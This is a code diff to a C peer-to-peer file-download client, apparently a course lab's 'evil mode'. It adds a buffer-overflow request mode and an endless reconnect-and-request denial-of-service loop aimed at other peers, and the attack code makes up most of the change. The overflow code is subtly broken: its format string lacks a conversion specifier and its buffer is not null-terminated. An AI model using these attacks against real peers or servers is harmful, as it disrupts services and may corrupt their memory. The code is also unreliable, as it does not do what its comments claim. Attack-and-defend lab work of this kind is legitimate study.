@@ -549,8 +549,26 @@ static void task_download(task_t *t, task_t *tracker_task)
 	}
 	osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
 
-	while(evil_mode)
+	//Buffer overflow attack
+	if(evil_mode == 1)
 	  {
+	    printf("Buffer overflow attack\n");
+
+	    //Allocate memory for the buffer overflow
+	    char bufferOverflow[FILENAMESIZ * 2];
+	    memset(bufferOverflow, 1, FILENAMESIZ * 2);
+
+	    //Write the buffer overflow input
+	    osp2p_writef(t->peer_fd, "GET % OSP2P\n", bufferOverflow);
+	  }
+	
+	//Denial of service (DOS) attack
+	while(evil_mode == 2)
+	  {
+	    printf("DOS attack on %s:%d with '%s'\n", inet_ntoa(t->peer_list
+								 ->addr),
+		    t->peer_list->port, t->filename);
+
 	    t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
 	    if(t->peer_fd == -1)
 	      {
@@ -558,7 +576,7 @@ static void task_download(task_t *t, task_t *tracker_task)
 		goto try_again;
 	      }
 	    osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
-	  }
+	    }
 
 	// Open disk file for the result.
 	// If the filename already exists, save the file in a name like
@@ -853,9 +871,7 @@ int main(int argc, char *argv[])
 			    printf("Download forking\n");
 			    task_download(t, tracker_task);
 			    exit(0);
-			  }
-
-			else if (child < 0)
+			  }			else if (child < 0)
 			  error("Download Forking error\n");
 
 			else
